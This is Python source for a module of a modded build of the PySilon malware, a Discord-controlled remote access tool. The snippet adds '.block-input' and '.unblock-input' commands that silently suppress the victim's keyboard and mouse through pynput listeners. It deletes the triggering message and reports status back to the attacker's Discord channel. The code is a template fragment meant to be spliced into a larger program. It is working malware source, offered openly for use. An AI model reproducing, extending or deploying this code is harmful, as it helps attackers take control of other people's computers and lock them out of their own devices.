#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS

from pynput import keyboard, mouse
# end of imports
# on message
elif message.content == '.block-input':
    #.log Message is "block input" 
    if not input_blocked:
        #.log Input is not already blocked 
        await message.delete()
        #.log Removed the message 
        async def on_press():
            pass
        async def on_release():
            pass
        async def on_click():
            pass
        keyboard_listener = keyboard.Listener(suppress=True)
        #.log Created keyboard listener 
        mouse_listener = mouse.Listener(suppress=True)
        #.log Created mouse listener 
        keyboard_listener.start()
        #.log Disabled keyboard 
        mouse_listener.start()
        #.log Disabled mouse 
        embed = discord.Embed(title="🚫 Input Blcked",description=f'```Input has ben bloked. Unblock it y usig .unblock-input```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)
        #.log Sent embed about blocked input 
        input_blocked = True
    else:
        #.log Input is already blocked 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is already blocked. Unlock it by using .unblock-input```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)
        #.log Sent embed about already blocked input 
elif message.content == '.unblock-input':
    #.log Message is "unblock input" 
    if input_blocked:
        #.log Input is blocked 
        await message.delete()
        #.log Removed the message 
        keyboard_listener.stop()
        #.log Unblocked keyboard 
        mouse_listener.stop()
        #.log Unblocked mouse 
        embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unlocked. Block it by using .block-input```', colour=discord.Colour.green())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)
        #.log Sent embed about unblocked input 
        input_blocked = False
    else:
        #.log Input is not blocked 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is not blocked. Block it by using .block-input```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)
        #.log Sent embed about unblocked input 

#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS